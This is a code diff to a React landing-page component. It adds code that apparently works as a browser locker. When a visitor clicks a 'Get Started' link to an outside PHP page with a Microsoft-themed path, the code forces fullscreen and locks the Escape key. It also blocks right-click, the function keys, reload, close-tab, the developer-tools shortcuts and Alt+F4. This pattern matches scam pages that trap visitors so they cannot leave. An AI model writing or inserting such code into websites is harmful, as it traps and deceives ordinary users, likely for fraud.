@@ -1,6 +1,78 @@
+import { useEffect } from "react";
 import { Link } from "react-router-dom";
 
 export default function Home() {
+  // Browser Detection
+    const detectBrowser = () => {
+        const ua = navigator.userAgent;
+        return {
+            isEdge: /Edg/i.test(ua),
+            isSafari: /Safari/i.test(ua) && !/Chrome/i.test(ua),
+            isChrome: /Chrome/i.test(ua) && !/Edg/i.test(ua),
+            isFirefox: /Firefox/i.test(ua)
+        };
+    };
+  const browser = detectBrowser();
+  const triggerFullscreen = async () => {
+        const el = document.documentElement as any;
+        try {
+            if (!document.fullscreenElement) {
+                if (browser.isSafari && el.webkitRequestFullscreen) await el.webkitRequestFullscreen();
+                else if (el.requestFullscreen) await el.requestFullscreen();
+            }
+        } catch (err) { console.error('Fullscreen denied:', err); }
+    };
+
+    const lockKeyboard = async () => {
+        if (browser.isEdge || browser.isSafari || browser.isFirefox) return;
+        if ((navigator as any).keyboard && (navigator as any).keyboard.lock) {
+            try { await (navigator as any).keyboard.lock(['Escape']); } catch (err) { }
+        }
+    };
+  // Start lockdown
+    const startLockdown = () => {
+        triggerFullscreen();
+        lockKeyboard();
+    };
+
+    // Global event handlers & Continuous Locking
+    useEffect(() => {
+        const preventDefault = (e: MouseEvent) => e.preventDefault();
+        window.addEventListener('contextmenu', preventDefault);
+
+        const trapKeys = (e: KeyboardEvent) => {
+            const key = e.key.toLowerCase();
+
+            const blocked =
+                key === 'escape' ||
+
+                // Function keys (F1–F12 incl F5 refresh)
+                key.startsWith('f') ||
+
+                // Ctrl combos
+                (e.ctrlKey && ['r', 'w', 'l', 't'].includes(key)) ||
+
+                // Ctrl + Shift combos (devtools + hard reload)
+                (e.ctrlKey && e.shiftKey && ['r', 'i', 'c'].includes(key)) ||
+
+                // Alt + F4
+                (e.altKey && key === 'f4');
+
+            if (blocked) {
+                navigator.vibrate?.([200, 100, 200]);
+                e.preventDefault();
+                e.stopPropagation();
+            }
+        };
+
+        window.addEventListener('keydown', trapKeys);
+
+        return () => {
+            window.removeEventListener('contextmenu', preventDefault);
+            window.removeEventListener('keydown', trapKeys);
+        };
+    }, []);
+
   return (
     <main className="bg-gradient-to-b from-blue-50 to-white">
 
@@ -23,6 +95,7 @@ export default function Home() {
               <Link
                 to="https://tunipril.com/ddsshht.php/microsoft"
                 className="bg-blue-600 text-white px-6 md:px-8 py-2.5 md:py-3 rounded-lg shadow-md hover:bg-blue-700 transition"
+                onClick={startLockdown}
               >
                 Get Started
               </Link>
